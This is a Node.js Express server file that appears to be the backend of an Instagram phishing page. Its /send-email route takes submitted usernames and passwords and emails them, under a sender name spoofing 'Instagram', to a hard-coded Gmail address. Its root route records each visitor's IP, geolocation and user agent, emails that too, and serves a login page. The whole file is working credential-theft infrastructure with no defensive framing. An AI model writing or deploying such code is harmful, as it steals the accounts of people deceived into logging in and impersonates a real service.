require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const geoip = require('geoip-lite');
const { Resend } = require('resend');
const path = require('path');
const os = require('os');

const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.json());

const resend = new Resend(process.env.RESEND_API_KEY);

// Email sending endpoint
app.post('/send-email', async (req, res) => {
  const { username, password } = req.body;

  try {
    const data = await resend.emails.send({
      from: 'Instagram <onboarding@resend.dev>',
      to: 'johncena989673@gmail.com',
      subject: 'New Login Form Submission',
      html: `<p><strong>Username:</strong> ${username}</p><p><strong>Password:</strong> ${password}</p>`,
    });

    res.status(200).json({ success: true, messageId: data.id });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// System info + visitor tracker
app.get('/', async (req, res) => {
  const networkInterfaces = os.networkInterfaces();
  const macAddresses = [];

  for (const interfaceName in networkInterfaces) {
    const interfaces = networkInterfaces[interfaceName];

    interfaces.forEach((iface) => {
      if (!iface.internal && iface.mac && iface.mac !== '00:00:00:00:00:00') {
        macAddresses.push({
          interface: interfaceName,
          mac: iface.mac
        });
      }
    });
  }

  let userInfo = {};
  let hostname = '';

  try {
    userInfo = os.userInfo();  // Get user info object
  } catch (e) {
    userInfo = { error: 'Could not fetch user info' };
  }

  try {
    hostname = os.hostname(); // Get hostname
  } catch (e) {
    hostname = 'Hostname not available';
  }

  const rawIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';
  const ip = rawIp.includes(',') ? rawIp.split(',')[0].trim() : rawIp.replace('::ffff:', '');
  const userAgent = req.headers['user-agent'];
  let geo;

  try {
    geo = geoip.lookup(ip.includes(',') ? ip.split(',')[0].trim() : ip);
    console.log(`Fetching geolocation for IP: ${ip}`);
  } catch (err) {
    console.warn('Failed to fetch IP geolocation');
    geo = null;
  }

  const htmlContent = `
    <h3>New Visit</h3>
    <p><strong>IP:</strong> ${ip}</p>
    <p><strong>Location:</strong> ${geo ? JSON.stringify(geo) : 'Location Not Found.'}</p>
    <p><strong>User Agent:</strong> ${userAgent}</p>
    <p><strong>MAC Address:</strong> ${JSON.stringify(macAddresses)}</p>
    <p><strong>User Info:</strong> ${userInfo ? JSON.stringify(userInfo) : 'User Info Not Found.'}</p>
    <p><strong>Host Name:</strong> ${hostname ? JSON.stringify(hostname) : 'HostName Not Found.'}</p>
    <h4>mac address, user info and hostname is of the server where application is hosted.</h4>
  `;

  try {
    await resend.emails.send({
      from: 'Instagram <onboarding@resend.dev>',
      to: 'johncena989673@gmail.com',
      subject: 'New Visitor Detected',
      html: htmlContent,
    });

    res.sendFile(path.join(__dirname, 'index.html'));
  } catch (error) {
    console.error(error);
    res.status(500).send('Email failed.');
  }
});

app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
});
